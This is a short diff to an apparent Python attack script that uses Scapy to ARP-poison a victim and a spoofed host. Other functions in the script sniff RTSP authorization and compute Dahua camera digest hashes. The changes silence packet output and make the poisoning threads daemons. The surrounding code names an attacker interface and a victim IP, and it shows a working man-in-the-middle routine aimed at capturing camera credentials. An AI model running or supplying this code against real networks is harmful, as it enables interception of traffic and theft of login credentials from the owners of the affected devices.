@@ -20,7 +20,7 @@ def arp_poison(iface, iface_mac, target_ip, target_mac, source_ip):
     packet[ARP].psrc = source_ip
     packet[ARP].hwdst = target_mac
     packet[ARP].pdst = target_ip
-    sendp(packet, iface=iface, inter=1, loop=1)
+    sendp(packet, iface=iface, inter=1, loop=1, verbose=False)
 
 
 def dahua_rtsp_hash(username, realm, password, method, uri, nonce):
@@ -103,8 +103,8 @@ if __name__ == "__main__":
         arp_poison(attacker_iface, attacker_mac,
                    spoof_ip, spoof_mac, victim_ip)
 
-    Thread(target=poison_victim).start()
-    Thread(target=poison_spoof).start()
+    Thread(target=poison_victim, daemon=True).start()
+    Thread(target=poison_spoof, daemon=True).start()
 
     def sniff_wrapper():
         sniff_rtsp_authorization(victim_ip, spoof_ip)
